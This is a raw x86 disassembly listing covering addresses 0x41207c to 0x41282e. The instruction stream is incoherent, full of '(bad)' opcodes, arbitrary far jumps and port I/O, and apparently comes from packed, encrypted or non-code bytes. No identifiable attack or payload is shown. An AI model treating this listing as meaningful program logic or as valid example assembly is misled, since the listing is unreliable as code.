  41207c:	dec    edi
  41207d:	xchg   ebx,eax
  41207e:	xchg   BYTE PTR [edi+0xf],ch
  412081:	pop    edi
  412082:	jb     0x412086
  412084:	gs aad 0x6
  412087:	pop    ecx
  412088:	test   eax,0xdc3ecb9d
  41208d:	xor    al,0x18
  41208f:	retf   0x2b05
  412092:	sbb    esi,DWORD PTR [eax-0x7d]
  412095:	push   ecx
  412096:	mov    bh,0x9d
  412098:	pop    ss
  412099:	call   0x3b8b:0x7abe7cc7
  4120a0:	sub    eax,0xd5e35644
  4120a5:	ret    0xcc59
  4120a8:	sbb    esi,edi
  4120aa:	jle    0x4120db
  4120ac:	cmp    DWORD PTR [ecx+ecx*4],esp
  4120af:	xor    DWORD PTR [ebx-0x34],edx
  4120b2:	sub    esi,ebx
  4120b4:	gs sbb eax,0xe03027ca
  4120ba:	mov    ebp,0xf2d45e1
  4120bf:	repnz (bad) 
  4120c2:	outs   dx,DWORD PTR ds:[esi]
  4120c3:	mov    cl,0x20
  4120c5:	sbb    eax,0x8506cdab
  4120ca:	cmp    DWORD PTR [esi],ebx
  4120cc:	scas   al,BYTE PTR es:[edi]
  4120cd:	(bad)  
  4120ce:	fidiv  WORD PTR [ebp-0x42]
  4120d1:	mov    DWORD PTR [edx-0x70],ebp
  4120d4:	mov    al,0x9b
  4120d6:	scas   eax,DWORD PTR es:[edi]
  4120d7:	jnp    0x412142
  4120d9:	mov    edi,0x65030be5
  4120de:	jle    0x412062
  4120e0:	adc    ebp,DWORD PTR [edi-0x5d]
  4120e3:	jno    0x4120bf
  4120e5:	enter  0xec87,0xf2
  4120e9:	sbb    cl,BYTE PTR [ebx]
  4120eb:	mov    ch,0x9b
  4120ed:	pop    ss
  4120ee:	adc    DWORD PTR [ebp-0x58e8dca0],0xffffffea
  4120f5:	xchg   ebp,eax
  4120f6:	or     BYTE PTR cs:[ebx+0x1011ac41],0xdb
  4120fe:	sub    cl,dl
  412100:	mov    al,0xbb
  412102:	test   ah,ch
  412104:	add    eax,0xc6a2371d
  412109:	xchg   ebp,eax
  41210a:	pop    es
  41210b:	cmp    bh,BYTE PTR [ecx+0x79]
  41210e:	std    
  41210f:	js     0x412107
  412111:	call   0xdbe3:0x9ab52a54
  412118:	xchg   ebx,eax
  412119:	repnz mov ah,0x3a
  41211c:	pop    ecx
  41211d:	add    esp,DWORD PTR [ecx+0x4a]
  412120:	inc    ecx
  412121:	cmp    eax,0x8b438e3f
  412126:	xchg   ecx,eax
  412127:	mov    ebx,eax
  412129:	loope  0x41216d
  41212b:	xor    eax,0x8a7df41e
  412130:	pop    es
  412131:	int3   
  412132:	(bad)  
  412133:	mov    edi,0x58d018bb
  412138:	mov    edi,0x54d86802
  41213d:	scas   eax,DWORD PTR es:[edi]
  41213e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41213f:	je     0x41215d
  412141:	mov    edi,0xbf9e84d6
  412146:	jno    0x4120ed
  412148:	jecxz  0x41218a
  41214a:	mov    esi,DWORD PTR [ecx+ebx*4+0x4b3100ae]
  412151:	cdq    
  412152:	call   0xf8edf5cb
  412157:	jb     0x41214b
  412159:	test   al,0xf7
  41215b:	cmp    DWORD PTR [edx],esi
  41215d:	cdq    
  41215e:	nop
  41215f:	jmp    0xfb4d:0x1f3bb2c1
  412166:	retf   0x9482
  412169:	or     DWORD PTR [esp+ebp*1],0x30
  41216d:	scas   al,BYTE PTR es:[edi]
  41216e:	cmp    eax,0x52727afe
  412173:	pop    es
  412174:	push   ss
  412175:	scas   eax,DWORD PTR es:[edi]
  412176:	push   0xb
  412178:	xor    al,0x2a
  41217a:	pop    ecx
  41217b:	cmp    ebp,ebx
  41217d:	mov    ?,esi
  41217f:	pop    esi
  412180:	mov    edi,0xc21bf772
  412185:	jbe    0x4121ea
  412187:	int    0xba
  412189:	pusha  
  41218a:	jl     0x4121c3
  41218c:	stc    
  41218d:	cmp    al,0x28
  41218f:	test   bh,cl
  412191:	or     DWORD PTR [ebx+0x4b],0x6
  412195:	fild   WORD PTR [esi-0x80]
  412198:	cmp    cl,BYTE PTR [edx-0x68442754]
  41219e:	xchg   edx,eax
  41219f:	pop    es
  4121a0:	mov    bh,0xf6
  4121a2:	es mov bl,0xf7
  4121a5:	adc    eax,DWORD PTR [eax]
  4121a7:	jmp    0xad7c:0x2684a5b6
  4121ae:	xlat   BYTE PTR ds:[ebx]
  4121af:	retf   
  4121b0:	add    DWORD PTR [edx-0x18],edi
  4121b3:	div    DWORD PTR [eax]
  4121b5:	cmp    BYTE PTR [ecx-0x1e],ah
  4121b8:	cdq    
  4121b9:	xlat   BYTE PTR ds:[ebx]
  4121ba:	dec    esp
  4121bb:	dec    ecx
  4121bc:	cmp    eax,0x9e62a5be
  4121c1:	dec    eax
  4121c2:	xchg   esi,ebx
  4121c4:	cmp    DWORD PTR [esi],esp
  4121c6:	retf   0xa893
  4121c9:	clc    
  4121ca:	ds (bad) 
  4121cc:	mov    ecx,0x148638e6
  4121d1:	sub    al,0x85
  4121d3:	in     al,dx
  4121d4:	xor    al,0xa4
  4121d6:	and    al,0x8a
  4121d8:	push   edi
  4121d9:	out    0x65,al
  4121db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121dc:	out    dx,eax
  4121dd:	ds loop 0x412256
  4121e0:	fwait
  4121e1:	call   0x4616ae27
  4121e6:	adc    DWORD PTR [esi+0x6],ecx
  4121e9:	xor    al,0x15
  4121eb:	ret    
  4121ec:	inc    ebx
  4121ed:	pop    ebp
  4121ee:	retf   0xb696
  4121f1:	loope  0x4121ae
  4121f3:	repnz retf 
  4121f5:	pop    edi
  4121f6:	call   0xf80e:0xa9fa5801
  4121fd:	add    al,0xb0
  4121ff:	jo     0x4121d2
  412201:	sbb    eax,0xb1c266aa
  412206:	cmc    
  412207:	jb     0x412266
  412209:	inc    esp
  41220a:	jnp    0x41227b
  41220c:	out    dx,al
  41220d:	jo     0x4121cd
  41220f:	adc    BYTE PTR [esi+edi*4-0x74776a07],al
  412216:	les    ecx,FWORD PTR [edx]
  412218:	cli    
  412219:	push   ss
  41221a:	add    al,0x81
  41221c:	aas    
  41221d:	aad    0x63
  41221f:	mov    esp,0x9ac4e5a0
  412224:	pusha  
  412225:	or     al,BYTE PTR [eax-0x1f447645]
  41222b:	push   ds
  41222c:	dec    edx
  41222d:	neg    BYTE PTR [edx]
  41222f:	out    0x9f,al
  412231:	gs push edi
  412233:	loop   0x412203
  412235:	and    al,0x54
  412237:	adc    BYTE PTR [esi-0x6609d01],cl
  41223d:	push   0xffffffe2
  41223f:	push   ds
  412240:	hlt    
  412241:	fimul  WORD PTR [esi-0x7]
  412244:	pop    edi
  412245:	lods   al,BYTE PTR ds:[esi]
  412246:	sahf   
  412247:	sti    
  412248:	addr16 inc edx
  41224a:	dec    esi
  41224b:	(bad)  [edi]
  41224d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41224f:	test   BYTE PTR [edx-0x62e8d515],ch
  412255:	cmp    bl,al
  412257:	pop    ecx
  412258:	add    edi,ebp
  41225a:	sbb    ch,BYTE PTR [edx+0xf82c3c6]
  412260:	and    eax,0xfe05e599
  412265:	(bad)  
  412266:	cwde   
  412267:	xor    al,ch
  412269:	and    cl,ah
  41226b:	gs xchg esi,eax
  41226d:	add    ah,BYTE PTR [eax]
  41226f:	xor    edi,eax
  412271:	hlt    
  412272:	dec    eax
  412273:	push   eax
  412274:	mov    al,0x57
  412276:	daa    
  412277:	out    0xb8,eax
  412279:	fcom   st(0)
  41227b:	test   DWORD PTR [edx],ecx
  41227d:	popf   
  41227e:	jae    0x412249
  412280:	xor    al,0xca
  412282:	push   ds
  412283:	shl    ch,cl
  412285:	cmp    eax,0xaa052691
  41228a:	mov    esi,0x3b747188
  41228f:	fwait
  412290:	sub    ecx,DWORD PTR ds:0x55940ae5
  412296:	cld    
  412297:	ret    
  412298:	push   edi
  412299:	stc    
  41229a:	fmul   DWORD PTR [esi+0x7cb6fc70]
  4122a0:	fild   WORD PTR [ecx]
  4122a2:	ret    0x27b9
  4122a5:	retf   0x33a8
  4122a8:	jecxz  0x4122f6
  4122aa:	cmc    
  4122ab:	dec    ebp
  4122ac:	mov    bl,0x7a
  4122ae:	mov    cl,0x32
  4122b0:	ficom  DWORD PTR [eax]
  4122b2:	jge    0x41231a
  4122b4:	cdq    
  4122b5:	mov    eax,0x37019dff
  4122ba:	add    BYTE PTR [ecx],ch
  4122bc:	dec    esp
  4122bd:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122bf:	mov    al,ds:0xdcee40f5
  4122c4:	push   esp
  4122c5:	ins    BYTE PTR es:[edi],dx
  4122c6:	xchg   ebp,eax
  4122c7:	dec    edx
  4122c8:	sub    al,0x8b
  4122ca:	xor    ebp,DWORD PTR [ecx-0x33a23a6]
  4122d0:	les    edx,FWORD PTR [ecx+ecx*2+0x327e4bb]
  4122d7:	in     eax,0x43
  4122d9:	dec    ecx
  4122da:	adc    BYTE PTR [ebp-0x323130c2],0xb0
  4122e1:	xchg   esp,eax
  4122e2:	retf   
  4122e3:	push   edx
  4122e4:	lds    eax,FWORD PTR [ebp+0x22]
  4122e7:	add    al,0xd4
  4122e9:	(bad)  
  4122ea:	cmp    DWORD PTR ds:0x34e97123,esp
  4122f0:	xor    ebx,DWORD PTR [ebx]
  4122f2:	out    dx,eax
  4122f3:	cs dec ecx
  4122f5:	or     ebp,esp
  4122f7:	add    al,0x3b
  4122f9:	jo     0x412334
  4122fb:	mov    ah,al
  4122fd:	mov    eax,ds:0x472a621c
  412302:	pop    edx
  412303:	adc    ebp,eax
  412305:	scas   eax,DWORD PTR es:[edi]
  412306:	dec    ebx
  412307:	inc    eax
  412308:	jecxz  0x412335
  41230a:	xor    ah,0x2f
  41230d:	(bad)  
  41230e:	mov    esi,0xa0586510
  412313:	mov    ecx,0xeb7ab449
  412318:	cmp    DWORD PTR [edi+esi*8-0x11],edx
  41231c:	mov    ch,0x37
  41231e:	cmp    ah,cl
  412320:	push   ebp
  412321:	aaa    
  412322:	mov    edi,0x56c2b604
  412327:	xor    DWORD PTR [ebx-0x4644e8f9],ebx
  41232d:	sub    bh,BYTE PTR [ebx+0x8]
  412330:	push   eax
  412331:	fnstcw WORD PTR [ebx+edx*8+0x7a2eee10]
  412338:	in     eax,0xc4
  41233a:	push   edx
  41233b:	dec    edi
  41233c:	inc    esp
  41233d:	sbb    DWORD PTR [ecx],esp
  41233f:	mul    BYTE PTR [edi]
  412341:	push   esi
  412342:	adc    BYTE PTR [ecx-0x1a],bh
  412345:	jne    0x4123b0
  412347:	daa    
  412348:	call   0x33771178
  41234d:	cld    
  41234e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41234f:	dec    edi
  412350:	aaa    
  412351:	pop    eax
  412352:	mov    ds:0x5df0eb8,eax
  412357:	rcl    DWORD PTR [ebx],0x50
  41235a:	pop    esi
  41235b:	and    eax,0x4543ee3b
  412360:	cs inc esp
  412362:	dec    edx
  412363:	retf   0xa2b7
  412366:	enter  0x1703,0x5a
  41236a:	push   edi
  41236b:	pop    ss
  41236c:	xchg   edx,eax
  41236d:	mov    esp,0xc8f0642
  412372:	push   edx
  412373:	test   DWORD PTR [ebx],esi
  412375:	jg     0x41230e
  412377:	pop    esp
  412378:	push   esp
  412379:	(bad)  
  41237b:	sub    BYTE PTR [ecx*2-0xd12ca18],al
  412382:	scas   al,BYTE PTR es:[edi]
  412383:	aas    
  412384:	mov    eax,0xebb96f7b
  412389:	xchg   ebx,eax
  41238a:	mov    ds:0xedd25b45,al
  41238f:	cwde   
  412390:	inc    ecx
  412391:	mul    edx
  412393:	aad    0x42
  412395:	fnstsw WORD PTR [ebp+0x4f]
  412398:	mov    ah,BYTE PTR [ebx+esi*8-0x2b4d3931]
  41239f:	cmp    ecx,DWORD PTR [ebx]
  4123a1:	pusha  
  4123a2:	and    ebx,DWORD PTR [ecx+0x1433fa67]
  4123a8:	pop    ebx
  4123a9:	retf   0xc883
  4123ac:	leave  
  4123ad:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4123af:	sbb    ebx,DWORD PTR [ecx-0x76]
  4123b2:	addr16 xchg edi,eax
  4123b4:	xchg   edx,eax
  4123b5:	cdq    
  4123b6:	lods   eax,DWORD PTR ds:[esi]
  4123b7:	adc    DWORD PTR es:[edi+0x7dcf41c5],ebx
  4123be:	fidivr DWORD PTR [ebp-0x37ccf256]
  4123c4:	jmp    0x4123c7
  4123c6:	imul   edx,DWORD PTR [edx],0xffffffba
  4123c9:	jne    0x4123ca
  4123cb:	test   al,0xf6
  4123cd:	push   ecx
  4123ce:	(bad)  
  4123cf:	repz cli 
  4123d1:	out    dx,al
  4123d2:	mov    bh,bh
  4123d4:	cmp    esi,DWORD PTR [edi+0x2bf7b90b]
  4123da:	adc    DWORD PTR ds:0xd2749e2a,esi
  4123e0:	stos   DWORD PTR es:[edi],eax
  4123e1:	iret   
  4123e2:	sbb    al,bl
  4123e4:	sub    BYTE PTR [ecx],dl
  4123e6:	add    DWORD PTR [edi-0x3a],ebp
  4123e9:	inc    ecx
  4123ea:	jo     0x412456
  4123ec:	daa    
  4123ed:	sub    DWORD PTR [edi-0x50],ecx
  4123f0:	call   0x2317:0x7350c361
  4123f7:	stos   BYTE PTR es:[edi],al
  4123f8:	xchg   esp,eax
  4123f9:	push   eax
  4123fa:	jnp    0x412424
  4123fc:	shl    BYTE PTR [edi+ecx*4],1
  4123ff:	scas   al,BYTE PTR es:[edi]
  412400:	inc    ebp
  412401:	mov    cl,0xbe
  412403:	pop    ds
  412404:	push   0x42
  412406:	fcomp  QWORD PTR [eax-0x53b098dc]
  41240c:	push   0x56
  41240e:	ins    DWORD PTR es:[edi],dx
  41240f:	xchg   BYTE PTR [edi],cl
  412411:	and    BYTE PTR [ecx-0x61],ch
  412414:	xchg   DWORD PTR [ecx],ebp
  412416:	ins    DWORD PTR es:[edi],dx
  412417:	inc    ecx
  412418:	gs out dx,eax
  41241a:	adc    eax,0xfb5e37d3
  41241f:	inc    edi
  412420:	cmp    eax,0x68221e8a
  412425:	xor    eax,0xbb82dca
  41242a:	add    DWORD PTR [ebx-0x43],ebx
  41242d:	ficom  WORD PTR [eax+edx*4+0xb]
  412431:	(bad)  
  412432:	dec    esp
  412433:	sbb    BYTE PTR [esi-0x1b],bl
  412436:	xchg   ebp,eax
  412437:	fisttp QWORD PTR [esp+esi*4-0x52ea6193]
  41243e:	pop    es
  41243f:	repz xchg edx,eax
  412441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412442:	cmp    al,0x42
  412444:	iret   
  412445:	xchg   esp,eax
  412446:	mov    esi,DWORD PTR [edx-0x1a3ce521]
  41244c:	cmp    ah,ah
  41244e:	xchg   ebp,eax
  41244f:	leave  
  412450:	in     eax,dx
  412451:	repnz or eax,0xe315ebcf
  412457:	fld    DWORD PTR [edi-0x385a3c0e]
  41245d:	dec    edx
  41245e:	add    BYTE PTR [esp+esi*4+0x49],ah
  412462:	jbe    0x412419
  412464:	stc    
  412465:	imul   eax,DWORD PTR [edi+ecx*4+0x153d27d],0x49
  41246d:	xchg   edi,eax
  41246e:	xor    al,0x96
  412470:	mov    ebp,0xc5d46398
  412475:	in     al,0xaf
  412477:	stos   BYTE PTR es:[edi],al
  412478:	jle    0x41244f
  41247a:	pop    ebp
  41247b:	pop    ds
  41247c:	ja     0x41247b
  41247e:	enter  0xd596,0x70
  412482:	cwde   
  412483:	xchg   esi,eax
  412484:	popf   
  412485:	fadd   st,st(1)
  412487:	fcom   QWORD PTR [edx]
  412489:	jp     0x41246b
  41248b:	sub    DWORD PTR [edi+0x19],eax
  41248e:	lock popf 
  412490:	or     ch,dh
  412492:	out    0xa2,eax
  412494:	call   0xd208:0x961c94af
  41249b:	lods   al,BYTE PTR ds:[esi]
  41249c:	lds    eax,FWORD PTR [esi+eiz*2]
  41249f:	push   ds
  4124a0:	stc    
  4124a1:	std    
  4124a2:	push   ds
  4124a3:	xchg   dl,bh
  4124a5:	inc    eax
  4124a6:	dec    edx
  4124a7:	repnz sbb DWORD PTR [eax+0x11],eax
  4124ab:	and    edi,DWORD PTR [ecx+0x7caf93f1]
  4124b1:	push   esp
  4124b2:	leave  
  4124b3:	inc    ecx
  4124b4:	and    ecx,DWORD PTR [ebp+0x5d2d94ba]
  4124ba:	loop   0x4124ff
  4124bc:	shl    dl,0xb4
  4124bf:	cwde   
  4124c0:	push   0x8b292802
  4124c5:	pop    es
  4124c6:	xchg   ecx,eax
  4124c7:	dec    ebx
  4124c8:	jns    0x41244d
  4124ca:	es jmp 0x412475
  4124cd:	sbb    BYTE PTR [ebx+0x7a2be204],cl
  4124d3:	sbb    edi,DWORD PTR [esi*1-0x21d336dc]
  4124da:	inc    edi
  4124db:	hlt    
  4124dc:	mov    edi,0x73a687b5
  4124e1:	sub    ebp,DWORD PTR [edx+0x3c]
  4124e4:	xor    bh,BYTE PTR [edx-0x6a]
  4124e7:	jmp    0x9735:0x955f077f
  4124ee:	ffree  st(2)
  4124f0:	(bad)  
  4124f1:	lsl    edi,WORD PTR [eax+0x62]
  4124f5:	sub    ebx,esi
  4124f7:	retf   0x58eb
  4124fa:	loope  0x4124f9
  4124fc:	dec    edx
  4124fd:	repz xchg esi,eax
  4124ff:	sar    DWORD PTR [edx+0x4b],cl
  412502:	jg     0x412541
  412504:	cdq    
  412505:	dec    edx
  412506:	paddsb mm5,QWORD PTR [ecx+ebx*8]
  41250a:	call   0xe3eb069e
  41250f:	inc    edi
  412510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412511:	jbe    0x41251b
  412513:	push   ebp
  412514:	sbb    BYTE PTR [eax],dl
  412516:	mov    edx,0x907a8c82
  41251b:	push   esp
  41251c:	jbe    0x412542
  41251e:	es out 0x2e,eax
  412521:	cmp    BYTE PTR cs:[eax-0x68],bl
  412525:	neg    DWORD PTR [ecx+0x16]
  412528:	dec    esi
  412529:	icebp  
  41252a:	jg     0x412542
  41252c:	push   cs
  41252d:	fs pop ss
  41252f:	pop    esi
  412530:	or     ebp,DWORD PTR [edx-0x4abb15ba]
  412536:	dec    ebp
  412537:	test   dl,bh
  412539:	cmp    dh,BYTE PTR [ebx+edi*8]
  41253c:	xchg   ebx,eax
  41253d:	fdiv   st,st(3)
  41253f:	data16 xlat BYTE PTR ds:[ebx]
  412541:	pusha  
  412542:	xor    ebp,DWORD PTR [edx-0x3f]
  412545:	xor    al,0x4e
  412547:	fcmovbe st,st(7)
  412549:	mov    cl,0xd5
  41254b:	repnz sar ah,0xf6
  41254f:	sbb    bh,BYTE PTR [edi+esi*8-0x58bfa0ab]
  412556:	pop    ds
  412557:	and    bh,BYTE PTR [edx+0x1f]
  41255a:	pop    edx
  41255b:	mov    ch,cl
  41255d:	das    
  41255e:	cld    
  41255f:	mov    ch,0x2
  412561:	(bad)  
  412562:	cld    
  412563:	test   al,0xb
  412565:	mov    al,ds:0x36ee4f18
  41256a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41256b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41256c:	or     DWORD PTR [ecx],eax
  41256e:	ja     0x4125e4
  412570:	dec    esi
  412571:	sub    esi,esi
  412573:	stos   BYTE PTR es:[edi],al
  412574:	sbb    DWORD PTR [esi-0x6a],edx
  412577:	mov    ds:0xd86ad2f7,al
  41257c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41257d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41257e:	icebp  
  41257f:	cmp    BYTE PTR [ebx],ch
  412581:	jge    0x41257d
  412583:	dec    esi
  412584:	nop
  412585:	inc    ebp
  412586:	inc    esi
  412587:	sub    al,0x21
  412589:	pushf  
  41258a:	mov    dh,bh
  41258c:	popf   
  41258d:	mov    bl,0xd
  41258f:	add    DWORD PTR [esi],eax
  412591:	sar    DWORD PTR [edi+ecx*2-0x6585f1b],0xe1
  412599:	jecxz  0x4125c8
  41259b:	cs out 0x4a,al
  41259e:	leave  
  41259f:	enter  0x33f7,0x73
  4125a3:	push   edi
  4125a4:	sub    DWORD PTR [edx+0x20],0x60
  4125a8:	lods   al,BYTE PTR ds:[esi]
  4125a9:	test   dh,dh
  4125ab:	jg     0x41256a
  4125ad:	daa    
  4125ae:	xchg   edx,eax
  4125af:	in     al,0xff
  4125b1:	dec    ebx
  4125b2:	pop    edi
  4125b3:	xchg   DWORD PTR [ecx-0x44ff6e26],ebx
  4125b9:	xor    esi,DWORD PTR [edi+0x6f681639]
  4125bf:	pop    ebx
  4125c0:	mov    esi,0x593f2a39
  4125c5:	int    0x23
  4125c7:	enter  0xa099,0x7d
  4125cb:	lods   al,BYTE PTR ds:[esi]
  4125cc:	push   esi
  4125cd:	adc    DWORD PTR [eax-0x3e],edx
  4125d0:	mov    dh,0x40
  4125d2:	pusha  
  4125d3:	jmp    0xe396962a
  4125d8:	inc    ecx
  4125d9:	add    ebx,ecx
  4125db:	ins    DWORD PTR es:[edi],dx
  4125dc:	or     BYTE PTR [edx-0x5c],dl
  4125df:	sahf   
  4125e0:	retf   
  4125e1:	adc    esp,DWORD PTR [edx-0x5b]
  4125e4:	pop    esp
  4125e5:	retf   
  4125e6:	jne    0x412586
  4125e8:	add    ebp,DWORD PTR [edi+0x4607e016]
  4125ee:	xchg   BYTE PTR [esi+0x0],cl
  4125f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4125f3:	ds loop 0x412602
  4125f6:	jge    0x4125c0
  4125f8:	xor    eax,0xee2c6fff
  4125fd:	std    
  4125fe:	(bad)  
  4125ff:	ror    BYTE PTR [ecx+0x5c],0x4d
  412603:	sub    DWORD PTR [eax+0x56],eax
  412606:	mov    ds:0xd73659f,al
  41260b:	les    eax,FWORD PTR [ebx+0x22186a42]
  412611:	sti    
  412612:	xor    eax,DWORD PTR [eiz*2-0x63b2e59b]
  412619:	repz dec esi
  41261b:	push   esp
  41261c:	xor    ebp,DWORD PTR [edi]
  41261e:	or     dl,ch
  412620:	fwait
  412621:	cmp    eax,0xbc73d971
  412626:	jg     0x41269c
  412628:	test   DWORD PTR ds:0x6d693bfb,0x2cbd3f58
  412632:	jns    0x4125e8
  412634:	push   eax
  412635:	stos   BYTE PTR es:[edi],al
  412636:	push   ebx
  412637:	lods   eax,DWORD PTR ds:[esi]
  412638:	xchg   esp,eax
  412639:	add    bh,BYTE PTR [ebx]
  41263b:	push   eax
  41263c:	jmp    0x41267d
  41263e:	add    DWORD PTR [ebp+0xc],edx
  412641:	je     0x4126a2
  412643:	pushf  
  412644:	mov    DWORD PTR [edx+0x2a131b55],esi
  41264a:	jno    0x4125fd
  41264c:	lock inc ebp
  41264e:	inc    edi
  41264f:	add    DWORD PTR [ebx-0x45],esi
  412652:	lahf   
  412653:	fst    DWORD PTR [edi+0x61774e92]
  412659:	ja     0x412652
  41265b:	(bad)  
  41265c:	and    al,ah
  41265e:	bound  eax,QWORD PTR [edx+0x2e]
  412661:	mov    WORD PTR [ebp-0x4c8cde15],?
  412667:	cs pop es
  412669:	and    BYTE PTR [ecx+0x6e7873e0],ch
  41266f:	fwait
  412670:	jmp    0x6687aa18
  412675:	ret    
  412676:	aam    0xb3
  412678:	or     BYTE PTR [ebp+0x47646f7a],al
  41267e:	loop   0x412647
  412680:	or     al,0x5c
  412682:	cmp    BYTE PTR [eax-0x20],cl
  412685:	test   al,0xc8
  412687:	cld    
  412688:	cdq    
  412689:	inc    ebx
  41268a:	mov    ebx,0x4b35a91
  41268f:	es jo  0x41267d
  412692:	dec    edi
  412693:	pop    esp
  412694:	pop    ss
  412695:	push   esi
  412696:	pop    edx
  412697:	retf   0xa2ad
  41269a:	pop    esp
  41269b:	push   ebp
  41269c:	aaa    
  41269d:	test   eax,0xb916d372
  4126a2:	lock lock and edi,DWORD PTR [esi+0x34]
  4126a7:	in     al,dx
  4126a8:	sub    dh,dh
  4126aa:	cmp    eax,DWORD PTR [eax-0xb]
  4126ad:	push   esi
  4126ae:	fsub   DWORD PTR [edi-0x2a]
  4126b1:	rcl    DWORD PTR [edx+0x6a95bbbc],cl
  4126b7:	jmp    0x412647
  4126b9:	fdivr  QWORD PTR [ebx-0x65]
  4126bc:	adc    eax,0xcd5d3b8b
  4126c1:	push   0x6af9d52c
  4126c6:	gs mov ebx,0xdd071c94
  4126cc:	push   ds
  4126cd:	add    bl,BYTE PTR [ebp+0x56b3e82f]
  4126d3:	lock mov eax,es:0x806feeee
  4126da:	and    al,0x96
  4126dc:	repnz pop ebx
  4126de:	mov    dl,ah
  4126e0:	std    
  4126e1:	ffree  st(0)
  4126e3:	scas   eax,DWORD PTR es:[edi]
  4126e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126e5:	leave  
  4126e6:	mov    ecx,0xd84d93c1
  4126eb:	cmp    eax,0x78118676
  4126f0:	jmp    0x41276c
  4126f2:	stc    
  4126f3:	jmp    0x3bc4:0xc7d2bdb2
  4126fa:	out    0x4e,eax
  4126fc:	jmp    0x41269d
  4126fe:	je     0x4126f2
  412700:	repnz sub esi,DWORD PTR [edi]
  412703:	mov    eax,0xf1324b11
  412708:	ja     0x412720
  41270a:	(bad)  
  41270b:	imul   esi,DWORD PTR [ecx+0x3a],0x8ef52259
  412712:	jl     0x412720
  412714:	adc    ebx,DWORD PTR [esi+0x7e]
  412717:	and    DWORD PTR [ebp+0xc],ecx
  41271a:	mov    bh,0xd0
  41271c:	mov    al,0xd9
  41271e:	ret    0x9d4c
  412721:	cli    
  412722:	dec    DWORD PTR [ecx+eax*8]
  412725:	xor    DWORD PTR [ebx],esi
  412727:	push   ecx
  412728:	jp     0x4126f3
  41272a:	lods   eax,DWORD PTR ds:[esi]
  41272b:	pop    edx
  41272c:	hlt    
  41272d:	adc    al,BYTE PTR [esi+0xd]
  412730:	arpl   WORD PTR [ebx+0x4445ee9e],sp
  412736:	test   DWORD PTR [ebp-0x2a36e5d],edx
  41273c:	add    bl,BYTE PTR [edx-0x65]
  41273f:	xchg   ecx,eax
  412740:	jg     0x412743
  412742:	xor    bl,cl
  412744:	adc    dh,dl
  412746:	pop    ebp
  412747:	cli    
  412748:	test   ch,dh
  41274a:	push   esp
  41274b:	xor    al,0xa
  41274d:	(bad)  
  41274e:	fs inc ebp
  412750:	add    al,0x68
  412752:	add    BYTE PTR [eax-0x6c57a473],dh
  412758:	idiv   DWORD PTR [eax]
  41275a:	fidivr DWORD PTR [eax+0x576eec18]
  412760:	fisub  DWORD PTR [esi]
  412762:	inc    edx
  412763:	mov    BYTE PTR [eax],al
  412765:	cld    
  412766:	pop    ebx
  412767:	test   BYTE PTR [eax+0xd],cl
  41276a:	mov    eax,0x5143872b
  41276f:	jecxz  0x412782
  412771:	sub    al,0x2e
  412773:	add    eax,0x23878d6d
  412778:	add    BYTE PTR [ecx+0x19],0xfb
  41277c:	cwde   
  41277d:	fsub   st,st(5)
  41277f:	ins    BYTE PTR es:[edi],dx
  412780:	cmp    al,0x2f
  412782:	add    cl,ch
  412784:	fbld   TBYTE PTR [edx-0x79764060]
  41278a:	mov    bl,0xef
  41278c:	sbb    BYTE PTR [eax],dl
  41278e:	dec    ebx
  41278f:	dec    eax
  412790:	adc    BYTE PTR [ecx-0x121533c0],dl
  412796:	mov    ecx,0x5531fe3c
  41279b:	shl    DWORD PTR [ebx+0x43],1
  41279e:	jae    0x412808
  4127a0:	pop    es
  4127a1:	adc    edx,DWORD PTR [ecx-0x33]
  4127a4:	push   0x36
  4127a6:	push   ecx
  4127a7:	aaa    
  4127a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127a9:	hlt    
  4127aa:	scas   eax,DWORD PTR es:[edi]
  4127ab:	add    ebx,esp
  4127ad:	jbe    0x4127b3
  4127af:	fsubp  st(5),st
  4127b1:	mov    al,ds:0xea79e22
  4127b6:	(bad)  
  4127b7:	cmp    dh,ch
  4127b9:	jecxz  0x412758
  4127bb:	retf   
  4127bc:	jg     0x41282e
  4127be:	jnp    0x41283a
  4127c0:	cmp    DWORD PTR [ebx],esi
  4127c2:	out    dx,al
  4127c3:	push   ecx
  4127c4:	sub    bh,dl
  4127c6:	mov    al,ds:0xddc0e192
  4127cb:	xchg   ecx,eax
  4127cc:	sbb    al,0x91
  4127ce:	push   ds
  4127cf:	test   BYTE PTR [eax+edi*4-0x78b87eb2],dl
  4127d6:	push   esi
  4127d7:	cmp    DWORD PTR [esp+edx*4-0x48],eax
  4127db:	sub    bh,dl
  4127dd:	ins    DWORD PTR es:[edi],dx
  4127de:	inc    esi
  4127df:	mov    cl,0x11
  4127e1:	vpshab ymm1,xmm6,xmm0
  4127e6:	xchg   ecx,eax
  4127e7:	mov    dh,0x37
  4127e9:	(bad)  
  4127ea:	cs mov bl,0xec
  4127ed:	arpl   sp,dx
  4127ef:	ret    0xf4e1
  4127f2:	jnp    0x412841
  4127f4:	jae    0x41279d
  4127f6:	sub    al,0xab
  4127f8:	ja     0x41286e
  4127fa:	enter  0xeca,0x6
  4127fe:	mov    DWORD PTR [ebp+0x55b922ec],0xf329a7d7
  412808:	(bad)  
  412809:	loope  0x4127bd
  41280b:	jge    0x41287f
  41280d:	ret    
  41280e:	mov    eax,0x1351718e
  412813:	lock or cl,al
  412816:	inc    ebp
  412817:	es adc al,0x55
  41281a:	sbb    al,BYTE PTR [ebx-0xc]
  41281d:	or     DWORD PTR [edx+ebx*2+0x78dc5404],ecx
  412824:	adc    cl,BYTE PTR [esi-0xe917c3e]
  41282a:	js     0x4127c8
  41282c:	mov    bl,0xa7
  41282e:	and    al,0x9f
